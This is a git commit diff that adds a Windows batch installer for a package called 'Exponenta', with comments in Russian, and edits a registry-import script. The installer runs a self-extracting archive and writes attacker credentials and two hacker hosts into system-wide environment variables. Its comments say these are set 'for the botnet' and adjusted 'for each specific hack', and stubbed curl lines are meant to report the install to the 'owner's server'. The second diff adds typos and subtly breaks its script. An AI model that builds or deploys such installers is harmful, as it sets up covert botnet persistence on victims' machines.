3511651eab63ae1842a106fa837c77c4c4e5fb9f
Юрий А. Денисов <yudenisov@mail.ru>
2018-06-19 21:07:18 +0400

    Third Commit

---
+++ Windows/pub1/Util/Install_MainExponenta.bat
@@ -0,0 +1,122 @@
+@echo off
+rem
+rem Коммандный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
+rem
+rem Файл возвращает:
+
+setlocal enableextensions enabledelayedexpansion
+
+Rem Установка системнмных переменных окружения
+
+set curdir=%CD%
+set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+set Dest_DIR=c:\Pub1
+
+rem Проверка зависимостей системного окружения
+rem
+if exist %Dest_DIR% goto already_Exist
+
+rem checknewid_E
+rem if not exist <файлы манифеста зависимостей>
+
+rem Подготовка пользовательских переменных окружения.
+rem Эти переменные окружения редактируются пользователем  под каждый конкретный взлом.
+rem Также проверяется наличие манифеста приложения или модуля. Если манифест присутствует -- ничегго не делается.
+rem создаём системные переменные Windows для ботнета
+set Hacker_User=%1
+set Hacker_Pass=%2
+set Hacker_host1=%3
+set Hacker_host2=%4
+
+
+echo -
+echo Добро пожаловать в программу установки пакета
+echo Данная программа устанавливает файлы в каталог %Dest_DIR%
+echo -
+
+rem Распаковка дистрибутива из SFX Архива в каталог %Dest_DIR%
+rem Автоматическая распаковка должна быть настроена отдельно
+rem Внимание! смотрите на назначение системных переменных!
+rem Совет. При программировании держите как сводку этот заполненный файл
+
+echo -
+echo Распаковываем дистрибутив...
+echo -
+MainExponenta.SFX.exe
+c:
+cd %Dest_DIR%
+cd Util
+
+rem Регистрация переменных, если нужно
+
+echo 
+echo Регистрируем новые переменные окружения...
+echo
+rem Reg Add "!Key_Var!" /v "!Параметр!" /t REG_SZ /d "!Параметр!" /f 2>&1 | %SystemRoot%\system32\find.exe >nul 2>nul /I "Ошибка" && goto UnSuccess
+rem echo The variable is created
+
+Reg Add "!Key!" /v Hacker_User /t REG_SZ /d "!Hacker_User!" /f
+Reg Add "!Key!" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
+Reg Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
+Reg Add "!Key!" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f
+Reg Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f
+call reg_addtopath.bat Util
+
+cd /d %curdir%
+
+
+rem Правка файлов конфигурации модуля Exponenta
+@echo on
+rem "=== Changing Exponente Config ==="
+rem
+
+rem Создание резервной копии onSysLoad
+rem
+rem backup-sysloads
+rem
+rem создание списка постоянных изменений для демонов
+rem echo > Packet_onload.bat
+rem echo  > packet_send.bat
+rem echo > packet_email.bat
+rem
+rem Копирование манифеста в нужное место
+rem
+rem
+echo off
+echo -
+echo Installation is made with Success!
+rem
+rem Отправка лога установки на сервер хозяина
+rem curl
+goto sess_Finish
+
+:already_Exist
+echo Installation Warning!
+echo This Packet has been already installed
+echo The yuden.Exponenta configuration stay the same.
+rem
+rem Отправка лога установки на сервер хозяина
+rem curl
+goto sess_Finish
+
+
+:UnSuccess
+echo General Error
+echo Installation may be incomplete!
+echo The yuden. Exponenta configuration stay the same.
+rem
+rem Отправка лога установки на сервер хозяина
+rem curl
+goto sess_Finish
+
+:Bad_ID
+echo General Error
+echo Bad ID or missing dependence
+echo 
+echo The yuden.Exponenta configuration stay the same.
+rem
+rem Отправка лога установки на сервер хозяина
+rem curl
+
+:sess_Finish
+rem pause
--- Windows/pub1/Util/reg_import_file.bat
+++ Windows/pub1/Util/reg_import_file.bat
@@ -1,14 +1,14 @@
 @echo off
 rem reg_import_file.bat is a script to add into the Windows Registry a file <file> with check of his presistens
 rem script returns 0 if success, 1 if file not found and 2 if cause general error at file adding
-rem Usage: > reg_import_file.bat <file name with extension>
+rem Usage: > reg_inport_fale.bat <file name with extension>
 setlocal enableextensions enabledelayedexpansion
 
 set sParam1=%1
 
 if not defined sParam1 goto ch_NoParam
 if not exist %1 goto ch_NoFile
-reg import %1 /f
+reg import %1
 if errorlevel == 0 goto ch_Ok
 goto ch_General
 
@@ -18,7 +18,7 @@ rem exit 0
 goto Finish
 
 :ch_General
-echo "Test. General Error in Adding file."
+echo "Test. General Eroor in Adding file."
 rem exit 2
 goto Finish
 
